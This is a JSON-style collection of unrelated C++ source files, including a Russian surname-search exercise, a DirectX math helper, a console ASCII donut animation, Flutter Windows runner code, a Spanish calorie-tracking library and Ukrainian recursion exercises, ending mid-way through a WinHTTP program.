\u0443\u0434\u043e\u0432\u043b\u0435\u0442\u0432\u043e\u0440\u044f\u0435\u0442 \u0443\u0441\u043b\u043e\u0432\u0438\u044f\u043c \u043f\u043e\u0438\u0441\u043a\u0430\";\r\n//            }\r\n//            cout << endl;\r\n//        }\r\n//    }\r\n//}\r\n\r\n\r\n    //------------------------------------------------------------------------------\r\n    // \u0411\u041b\u041e\u041a \u0427\u0422\u0415\u041d\u0418\u042f \u0418\u0417 \u0424\u0410\u0419\u041b\u0410\r\n    //------------------------------------------------------------------------------\r\n\r\n    // \u0412\u044b\u0432\u043e\u0434 \u0438\u0441\u0445\u043e\u0434\u043d\u044b\u0445 \u0434\u0430\u043d\u043d\u044b\u0445\r\n    if (!file.is_open())\r\n    {\r\n        cout << \"\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043e\u0442\u043a\u0440\u044b\u0442\u044c \u0444\u0430\u0439\u043b!\" << endl;\r\n        return 0;\r\n    }\r\n\r\n    cout << \"\u0418\u0441\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435:\" << endl;\r\n\r\n    while (!file.eof()) {\r\n\r\n        file.getline(forPrint, sizeof(forPrint), '\\n');\r\n        cout << forPrint << endl;\r\n\r\n        // \u041f\u0443\u0441\u0442\u043e\u0439 \u0444\u0430\u0439\u043b\r\n        if ((file.eof()) && (file.fail()) && (i == 0))\r\n        {\r\n            cout << \"\u0418\u0441\u0445\u043e\u0434\u043d\u044b\u0445 \u0434\u0430\u043d\u043d\u044b\u0445 \u043d\u0435\u0442. \u0424\u0430\u0439\u043b \u043f\u0443\u0441\u0442!\" << endl;\r\n            file.close();\r\n            return 0;\r\n        }\r\n\r\n        ++i;\r\n    }\r\n    cout << endl;\r\n\r\n    // \u0412 \u0444\u0430\u0439\u043b\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0444\u0430\u043c\u0438\u043b\u0438\u044f, \u043f\u043e \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u0438\u0449\u0443\u0442\r\n    if ((file.eof()) && (i == 1))\r\n    {\r\n        cout << \"\u0424\u0430\u043c\u0438\u043b\u0438\u0438 \u043d\u0435 \u0432\u0432\u0435\u0434\u0435\u043d\u044b!\" << endl;\r\n        file.close();\r\n        return 0;\r\n    }\r\n\r\n    file.close();\r\n\r\n    //\u0412\u044b\u0432\u043e\u0434 \u0444\u0430\u043c\u0438\u043b\u0438\u0439 \u0441 \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0430\u043c\u0438\r\n    \r\n    file.open(\"fam.txt\");\r\n\r\n    i = 0;\r\n    cout << \"\u0424\u0430\u043c\u0438\u043b\u0438\u0438 \u0441 \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0430\u043c\u0438:\" << endl;\r\n\r\n\r\n    while (!file.eof()) {\r\n\r\n        if (i == 0) {\r\n            file.getline(searchingSurname, sizeof(searchingSurname), '\\n');\r\n            cout << \"\u041e\u0441\u0443\u0449\u0435\u0441\u0442\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043f\u043e\u0438\u0441\u043a \u043f\u043e \u0444\u0430\u043c\u0438\u043b\u0438\u0438: \" << searchingSurname << endl;\r\n        }\r\n\r\n        else {\r\n   ",
    "//***************************************************************************************\n// MathHelper.cpp by Frank Luna (C) 2011 All Rights Reserved.\n//***************************************************************************************\n\n#include \"MathHelper.h\"\n#include <float.h>\n#include <cmath>\n\nusing namespace DirectX;\n\nconst float MathHelper::Infinity = FLT_MAX;\nconst float MathHelper::Pi       = 3.1415926535f;\n\nfloat MathHelper::AngleFromXY(float x, float y)\n{\n\tfloat theta = 0.0f;\n \n\t// Quadrant I or IV\n\tif(x >= 0.0f) \n\t{\n\t\t// If x = 0, then atanf(y/x) = +pi/2 if y > 0\n\t\t//                atanf(y/x) = -pi/2 if y < 0\n\t\ttheta = atanf(y / x); // in [-pi/2, +pi/2]\n\n\t\tif(theta < 0.0f)\n\t\t\ttheta += 2.0f*Pi; // in [0, 2*pi).\n\t}\n\n\t// Quadrant II or III\n\telse      \n\t\ttheta = atanf(y/x) + Pi; // in [0, 2*pi).\n\n\treturn theta;\n}\n\nXMVECTOR MathHelper::RandUnitVec3()\n{\n\tXMVECTOR One  = XMVectorSet(1.0f, 1.0f, 1.0f, 1.0f);\n\tXMVECTOR Zero = XMVectorZero();\n\n\t// Keep trying until we get a point on/in the hemisphere.\n\twhile(true)\n\t{\n\t\t// Generate random point in the cube [-1,1]^3.\n\t\tXMVECTOR v = XMVectorSet(MathHelper::RandF(-1.0f, 1.0f), MathHelper::RandF(-1.0f, 1.0f), MathHelper::RandF(-1.0f, 1.0f), 0.0f);\n\n\t\t// Ignore points outside the unit sphere in order to get an even distribution \n\t\t// over the unit sphere.  Otherwise points will clump more on the sphere near \n\t\t// the corners of the cube.\n\n\t\tif( XMVector3Greater( XMVector3LengthSq(v), One) )\n\t\t\tcontinue;\n\n\t\treturn XMVector3Normalize(v);\n\t}\n}\n\nXMVECTOR MathHelper::RandHemisphereUnitVec3(XMVECTOR n)\n{\n\tXMVECTOR One  = XMVectorSet(1.0f, 1.0f, 1.0f, 1.0f);\n\tXMVECTOR Zero = XMVectorZero();\n\n\t// Keep trying until we get a point on/in the hemisphere.\n\twhile(true)\n\t{\n\t\t// Generate random point in the cube [-1,1]^3.\n\t\tXMVECTOR v = XMVectorSet(MathHelper::RandF(-1.0f, 1.0f), MathHelper::RandF(-1.0f, 1.0f), MathHelper::RandF(-1.0f, 1.0f), 0.0f);\n\n\t\t// Ignore points outside the unit sphere in order to get an even distribution \n\t\t// over the unit sphere.  Otherwise points will clump more on the sphere near \n\t\t// the corners of the cube.\n\t\t\n\t\tif( XMVector3Greater( XMVector3LengthSq(v), One) )\n\t\t\tcontinue;\n\n\t\t// Ignore points in the bottom hemisphere.\n\t\tif( XMVector3Less( XMVector3Dot(n, v), Zero ) )\n\t\t\tcontinue;\n\n\t\treturn XMVector3Normalize(v);\n\t}\n}",
    "//              k;double sin()\n//          ,cos();main(){float A=\n//        0,B=0,i,j,z[1760];char b[\n//      1760];printf(\"\\x1b[2J\");for(;;\n//   ){memset(b,32,1760);memset(z,0,7040)\n//   ;for(j=0;6.28>j;j+=0.07)for(i=0;6.28\n//  >i;i+=0.02){float c=sin(i),d=cos(j),e=\n//  sin(A),f=sin(j),g=cos(A),h=d+2,D=1/(c*\n//  h*e+f*g+5),l=cos      (i),m=cos(B),n=s\\\n// in(B),t=c*h*g-f*        e;int x=40+30*D*\n// (l*h*m-t*n),y=            12+15*D*(l*h*n\n// +t*m),o=x+80*y,          N=8*((f*e-c*d*g\n//  )*m-c*d*e-f*g-l        *d*n);if(22>y&&\n//  y>0&&x>0&&80>x&&D>z[o]){z[o]=D;;;b[o]=\n//  \".,-~:;=!*#$@\"[N>0?N:0];}}/*#****!!-*/\n//   printf(\"\\x1b[H\");for(k=0;1761>k;k++)\n//    putchar(k%80?b[k]:10);A+=0.04;B+=\n//      0.02;}}/*****####*******!!=;:~\n//        ~::==!!!**********!!!==::-\n//          .,~~;;;========;;;:~-.\n//              ..,--------,*/\n\n#include <stdio.h>\n#include <cmath>\n#include <windows.h>\n\n// An implementation of gotoxy() function for positioning the cursor\nvoid gotoxy(SHORT x, SHORT y)\n{\n    static HANDLE h = NULL;\n    if (!h)\n        h = GetStdHandle(STD_OUTPUT_HANDLE);\n    COORD c = { x, y };\n    SetConsoleCursorPosition(h, c);\n}\n\nint main()\n{\n    float A = 0, B = 0;\n    float i, j;\n    int k;\n    float z[1760];\n    char b[1760];\n\n    system(\"cls\"); // Clear screen\n\n    while (1)\n    {\n        memset(b, 32, 1760); // Fill b with spaces\n        memset(z, 0, 7040);  // Fill z with 0s\n\n        // Loop through phi and theta\n        for (j = 0; j < 6.28; j += 0.07)\n        {\n            for (i = 0; i < 6.28; i += 0.02)\n            {\n                float c = std::sin(i);\n                float d = std::cos(j);\n                float e = std::sin(A);\n                float f = std::sin(j);\n                float g = std::cos(A);\n                float h = d + 2;\n                float D = 1 / (c * h * e + f * g + 5);\n                float l = std::cos(i);\n                float m = std::cos(B);\n                float n = std::sin(B);\n                float t = c * h * g - f * e;\n                int x = 40 + 30 * D * (l * h * m - t * n);\n                int y = 12 + 15 * D * (l * h * n + t * m);\n                int o = x + 80 * y;\n                int N = 8 * ((f * e - c * d * g) * m - c * d * e - f * g - l * d * n);\n\n                if (22 > y && y > 0 && x > 0 && 80 > x && D > z[o])\n                {\n                    z[o] = D;\n                    b[o] = \".,-~:;=!*#$@\"[N > 0 ? N : 0];\n                }\n            }\n        }\n\n        // Move cursor to top-left corner\n        gotoxy(0, 0);\n\n        // Print the buffer\n        for (k = 0; k < 1761; k++)\n        {\n            printf(\"%c\",k % 80 ? b[k] : 10); // Print newline after every 80 characters\n\t\t\tA += 0.00004;\n            B += 0.00002;\n        }\n\n        // Sleep for a short interval\n        Sleep(10);\n    }\n\n    return 0;\n}\n\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// CaloriesLibrary.cpp\n\n\n#include \"CaloriesLibrary.h\"\n#include <iostream>\n#include <windows.h> \n\n\n\n//colors\n#define BLACK   \"\\x1B[30m\"\n#define RED     \"\\x1b[31m\"\n#define GREEN   \"\\x1b[32m\"\n#define YELLOW  \"\\x1b[33m\"\n#define BLUE    \"\\x1b[34m\"\n#define MAGENTA \"\\x1b[35m\"\n#define CYAN    \"\\x1b[36m\"\n#define WHITE   \"\\x1B[37m\"\n#define ORANGE  \"\\x1B[38;2;255;128;0m\"\n#define ROSE    \"\\x1B[38;2;255;151;203m\"\n#define LBLUE   \"\\x1B[38;2;53;149;240m\"\n#define LGREEN  \"\\x1B[38;2;17;245;120m\"\n#define GRAY    \"\\x1B[38;2;176;174;174m\"\n#define RESET   \"\\x1b[0m\"\n\n\nstd::string CaloriesLibrary::ejercicios[30];\nint CaloriesLibrary::calorias[30];\nint CaloriesLibrary::ejercicios_realizados[30];\nint CaloriesLibrary::repeticiones_realizadas[30];\nint CaloriesLibrary::calorias_repeticion[30];\n\nvoid CaloriesLibrary::initEjercicios() {\n    ejercicios[0] = \"Abdominales\";\n    ejercicios[1] = \"Flexiones\";\n    ejercicios[2] = \"Prensa de piernas\";\n    ejercicios[3] = \"Sentadillas\";\n    ejercicios[4] = \"Levantamiento de pesas\";\n    ejercicios[5] = \"Burpees\";\n    ejercicios[6] = \"Zancadas\";\n    ejercicios[7] = \"Fondos de triceps\";\n    ejercicios[8] = \"Peso muerto\";\n    ejercicios[9] = \"Elevaciones laterales\";\n    ejercicios[10] = \"Curl de biceps\";\n    ejercicios[11] = \"Pull-ups\";\n    ejercicios[12] = \"Plancha\";\n    ejercicios[13] = \"Box jumps\";\n    ejercicios[14] = \"Remo en m\u00e1quina\";\n    ejercicios[15] = \"Step-ups\";\n    ejercicios[16] = \"Lunges\";\n    ejercicios[17] = \"Press de hombros\";\n    ejercicios[18] = \"Abducciones de cadera\";\n    ejercicios[19] = \"Crunches\";\n    ejercicios[20] = \"Press de banca\";\n    ejercicios[21] = \"Pulldown de triceps\";\n    ejercicios[22] = \"Remo sentado\";\n    ejercicios[23] = \"Curl de biceps con barra\";\n    ejercicios[24] = \"Press de triceps\";\n    ejercicios[25] = \"Vuelos laterales\";\n    ejercicios[26] = \"Pullover\";\n    ejercicios[27] = \"Curl de piernas\";\n    ejercicios[28] = \"Extension de piernas\";\n    ejercicios[29] = \"Encogimientos de hombros\";\n\n    calorias[0] = 4;  // Calor\u00edas para Abdominales\n    calorias[1] = 3;  // Calor\u00edas para Flexiones\n    calorias[2] = 2;  // Calor\u00edas para Prensa de piernas\n    calorias[3] = 3;  // Calor\u00edas para Sentadillas\n    calorias[4] = 5;  // Calor\u00edas para Levantamiento de pesas\n    calorias[5] = 8;  // Calor\u00edas para Burpees\n    calorias[6] = 3;  // Calor\u00edas para Zancadas\n    calorias[7] = 4;  // Calor\u00edas para Fondos de triceps\n    calorias[8] = 5;  // Calor\u00edas para Peso muerto\n    calorias[9] = 3;  // Calor\u00edas para Elevaciones laterales\n    calorias[10] = 3; // Calor\u00edas para Curl de biceps\n    calorias[11] = 6; // Calor\u00edas para Pull-ups\n    calorias[12] = 2; // Calor\u00edas para Plancha\n    calorias[13] = 9; // Calor\u00edas para Box jumps\n    calorias[14] = 6; // Calor\u00edas para Remo en m\u00e1quina\n    calorias[15] = 4; // Calor\u00edas para Step-ups\n    calorias[16] = 3; // Calor\u00edas para Lunges\n    calorias[17] = 4; // Calor\u00edas para Press de hombros\n    calorias[18] = 3; // Calor\u00edas para Abducciones de cadera\n    calorias[19] = 4; // Calor\u00edas para Crunches\n    calorias[20] = 5; // Calor\u00edas para Press de banca\n    calorias[21] = 4; // Calor\u00edas para Pulldown de triceps\n    calorias[22] = 6; // Calor\u00edas para Remo sentado\n    calorias[23] = 3; // Calor\u00edas para Curl de biceps con barra\n    calorias[24] = 4; // Calor\u00edas para Press de triceps\n    calorias[25] = 3; // Calor\u00edas para Vuelos laterales\n    calorias[26] = 4; // Calor\u00edas para Pullover\n    calorias[27] = 4; // Calor\u00edas para Curl de piernas\n    calorias[28] = 3; // Calor\u00edas para Extension de piernas\n    calorias[29] = 2; // Calor\u00edas para Encogimientos de hombros\n\n    for (size_t i = 0; i < 30; i++)\n    {\n        ejercicios_realizados[i] = 0;\n    }\n    for (size_t i = 0; i < 30; i++)\n    {\n        repeticiones_realizadas[i] = 0;\n    }\n    \n    calorias_repeticion[0] = 0.35;   // Abdominales\n    calorias_repeticion[1] = 0.45;    // Flexiones\n    calorias_repeticion[2] = 0.25;   // Prensa de piernas\n    calorias_repeticion[3] = 0.3;   // Sentadillas\n    calorias_repeticion[4] = 0.4;   // Levantamiento de pesas\n    calorias_repeticion[5] = 0.8;   // Burpees\n    calorias_repeticion[6] = 0.35;   // Zancadas\n    calorias_repeticion[7] = 0.5;   // Fondos de tr\u00edceps\n    calorias_repeticion[8] = 0.4;   // Peso muerto\n    calorias_repeticion[9] = 0.3;   // Elevaciones laterales\n    calorias_repeticion[10] = 0.3;  // Curl de b\u00edceps\n    calorias_repeticion[11] = 0.6;  // Pull-ups\n    calorias_repeticion[12] = 0.2;   // Plancha\n    calorias_repeticion[13] = 0.7;  // Box jumps\n    calorias_repeticion[14] = 0.45;  // Remo en m\u00e1quina\n    calorias_repeticion[15] = 0.4;  // Step-ups\n    calorias_repeticion[16] = 0.35;  // Lunges\n    calorias_repeticion[17] = 0.35;  // Press de hombros\n    calorias_repeticion[18] = 0.3;  // Abducciones de cadera\n    calorias_repeticion[19] = 0.3;  // Crunches\n    calorias_repeticion[20] = 0.5;   // Press de banca\n    calorias_repeticion[21] = 0.4;  // Pulldown de tr\u00edceps\n    calorias_repeticion[22] = 0.45;  // Remo sentado\n    calori",
    "#include <iostream>\n#include <string>\n#include <cmath>\nusing namespace std;\n\nint k = 1;\n\nint sum_n(int n) {\n    if (n == 0)\n        return 0;\n    return n % 10 + sum_n(n / 10);\n}\n\nvoid tail_r_arithmetic(int* mas, int n, int a, int d, int ind) {\n    if (ind == n)\n        return;\n    mas[ind] = mas[ind - 1] + d;\n    tail_r_arithmetic(mas, n, a, d, ind + 1);\n}\n\nvoid linear_r_arithmetic(int* mas, int n, int a, int d, int k) {\n    if (k > 1) {\n        k--;\n        linear_r_arithmetic(mas, n, a, d, k);\n    }\n    mas[k] = a + (k - 1) * d;\n}\n\nvoid tail_r_geometric(int* mas, int n, int a, int r, int ind) {\n    if (ind == n)\n        return;\n    mas[ind] = mas[ind - 1] * r;\n    tail_r_geometric(mas, n, a, r, ind + 1);\n}\n\nvoid linear_r_geometric(int* mas, int n, int a, int r, int k) {\n    if (k > 1) {\n        k--;\n        linear_r_geometric(mas, n, a, r, k);\n    }\n    mas[k] = a * pow(r, k - 1);\n}\n\nvoid print(int* mas, int n) {\n    for (int i = 0; i < n; i++)\n        cout << mas[i] << \" \";\n    cout << endl;\n}\n\nint main() {\n    setlocale(LC_ALL, \"Ukr\");\n    cout << \"\u00c7\u00e0\u00e2\u00e4\u00e0\u00ed\u00ed\u00ff 1: \u00f1\u00f2\u00e2\u00ee\u00f0\u00e8\u00f2\u00e8 \u00e0\u00f0\u00e8\u00f4\u00ec\u00e5\u00f2\u00e8\u00f7\u00ed\u00f3 \u00ef\u00f0\u00ee\u00e3\u00f0\u00e5\u00f1i\u00fe \u00e7\u00e0 \u00e4\u00ee\u00ef\u00ee\u00ec\u00ee\u00e3\u00ee\u00fe \u00f0\u00e5\u00ea\u00f3\u00f0\u00f1i\u00bf\" << endl;\n    int b, n, ind = 1;\n    int mas[100];\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4i\u00f2\u00fc \u00f0\u00ee\u00e7\u00eci\u00f0 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3: \";\n    cin >> n;\n    cout << \"\u00c2\u00e2\u00e5\u00e4i\u00f2\u00fc \u00ef\u00e5\u00f0\u00f8\u00e8\u00e9 \u00f7\u00eb\u00e5\u00ed \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3 (\u00f6i\u00eb\u00e5 \u00f7\u00e8\u00f1\u00eb\u00ee): \";\n    cin >> mas[0];\n    cout << \"\u00c2\u00e2\u00e5\u00e4i\u00f2\u00fc \u00f0i\u00e7\u00ed\u00e8\u00f6\u00fe \u00e0\u00f0\u00e8\u00f4\u00ec\u00e5\u00f2\u00e8\u00f7\u00ed\u00ee\u00bf \u00ef\u00f0\u00ee\u00e3\u00f0\u00e5\u00f1i\u00bf: \";\n    cin >> b;\n    tail_r_arithmetic(mas, n, mas[0], b, ind);\n    cout << \"\u00c0\u00f0\u00e8\u00f4\u00ec\u00e5\u00f2\u00e8\u00f7\u00ed\u00e0 \u00ef\u00f0\u00ee\u00e3\u00f0\u00e5\u00f1i\u00ff \u00e7\u00e0 \u00f5\u00e2\u00ee\u00f1\u00f2\u00ee\u00e2\u00ee\u00fe \u00f0\u00e5\u00ea\u00f3\u00f0\u00f1i\u00ba\u00fe:\" << endl;\n    print(mas, n);\n\n    for (int i = 1; i < n; i++)\n        mas[i] = 0;\n    k = n;\n    linear_r_arithmetic(mas, n, mas[0], b, k);\n    cout << \"\u00c0\u00f0\u00e8\u00f4\u00ec\u00e5\u00f2\u00e8\u00f7\u00ed\u00e0 \u00ef\u00f0\u00ee\u00e3\u00f0\u00e5\u00f1i\u00ff \u00e7\u00e0 \u00ebi\u00edi\u00e9\u00ed\u00ee\u00fe \u00f0\u00e5\u00ea\u00f3\u00f0\u00f1i\u00ba\u00fe:\" << endl;\n    print(mas, n);\n\n    cout << endl;\n    cout << \"\u00c7\u00e0\u00e2\u00e4\u00e0\u00ed\u00ed\u00ff 2: \u00e7\u00ed\u00e0\u00e9\u00f2\u00e8 \u00f1\u00f3\u00ec\u00f3 \u00f6\u00e8\u00f4\u00f0 \u00e7\u00e0\u00e4\u00e0\u00ed\u00ee\u00e3\u00ee \u00ed\u00e0\u00f2\u00f3\u00f0\u00e0\u00eb\u00fc\u00ed\u00ee\u00e3\u00ee \u00f7\u00e8\u00f1\u00eb\u00e0.\" << endl;\n    int r;\n    cout << \"\u00c2\u00e2\u00e5\u00e4i\u00f2\u00fc \u00f7\u00e8\u00f1\u00eb\u00ee: \";\n    cin >> r;\n    cout << \"\u00d1\u00f3\u00ec\u00e0 \u00f6\u00e8\u00f4\u00f0 \u00f7\u00e8\u00f1\u00eb\u00e0: \" << sum_n(r) << endl;\n\n    system(\"pause\");\n    return 0;\n}",
    "#define WIN32_LEAN_AND_MEAN\r\n#define NOMINMAX\r\n#include <Windows.h>\r\n#include <Winhttp.h>\r\n\r\n#pragma comment(lib, \"winhttp.lib\")\r\n\r\n#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n#include <print>\r\n\r\nusing std::cout;\r\nusing std::endl;\r\nusing std::println;\r\nusing std::wcout;\r\n\r\nusing str = std::string; // NOTE: all std::string are utf-8 encoded\r\nusing wstr = std::wstring;\r\nusing str_cref = std::string const &;\r\nusing wstr_cref = std::wstring const &;\r\ntemplate <typename T>\r\nusing vec = std::vector<T>;\r\n\r\nstr to_UTF8(wstr_cref wide_str)\r\n{\r\n    int size = WideCharToMultiByte(\r\n        CP_UTF8, 0, wide_str.c_str(), -1,\r\n        nullptr, 0, nullptr, nullptr);\r\n\r\n    if (size == 0)\r\n        return \"\";\r\n\r\n    auto utf8_str = std::string(size, '\\0');\r\n\r\n    WideCharToMultiByte(\r\n        CP_UTF8, 0, wide_str.c_str(), -1,\r\n        &utf8_str[0], size, nullptr, nullptr);\r\n\r\n    return utf8_str;\r\n}\r\n\r\nstr last_error_as_string(DWORD last_error)\r\n{\r\n    auto constexpr buffer_count = 1024;\r\n    WCHAR buffer[buffer_count]{};\r\n\r\n    DWORD size = FormatMessageW(\r\n        FORMAT_MESSAGE_FROM_SYSTEM |\r\n            FORMAT_MESSAGE_IGNORE_INSERTS |\r\n            FORMAT_MESSAGE_MAX_WIDTH_MASK,\r\n        NULL,\r\n        last_error,\r\n        NULL,\r\n        (wchar_t *)&buffer,\r\n        buffer_count,\r\n        NULL);\r\n\r\n    return to_UTF8(wstr(buffer, size));\r\n}\r\n\r\nint main()\r\n{\r\n    HINTERNET hSession = 